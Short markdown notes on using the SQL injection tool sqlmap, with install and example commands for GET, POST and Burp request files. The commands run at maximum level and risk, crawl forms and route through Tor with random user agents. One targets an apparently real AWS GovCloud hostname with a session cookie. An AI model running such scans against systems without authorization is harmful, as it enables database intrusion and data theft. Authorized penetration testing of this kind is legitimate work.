

# install

    brew install sqlmap
    

# usage

example usage

    sqlmap --user-agent "test" --url "https://example.com" --threads=4 --dbms MySQL --level=5 --risk=3 --banner --answers="union-char=Y" --keep-alive --eta -v 3


## GET

    sqlmap --dbms MySQL --banner -u "https://example.com/api/user/*" -v 4 --random-agent --threads 2 --cookie="JSESSIONID=23469E1D65EE8ECFA2D3620BDD5102B3;" 

## POST

    sqlmap --user-agent "test" --url "https://example.com" --cookie="JSESSIONID=AB29721D2EBA6A05E59F57DEFA0CD5E9;"  -p "userid"  --level 5 
    
sqlmap -u https://boutte-reanplatform-dockerhost-208184116.us-gov-west-1.elb.amazonaws.com/reandeploy#/home/dnow/1 --forms --batch --crawl=10 --cookie="JSESSIONID=9C8352B26D684A5D1AA725628B0082EE;" --level=5 --risk=3



## burp suite

attach post request with configuration coming from burp file
    
    sqlmap -r search-test.txt -p "param1,param2,param3" --dbms MySQL --banner --random-agent --tor --tor-check --threads 2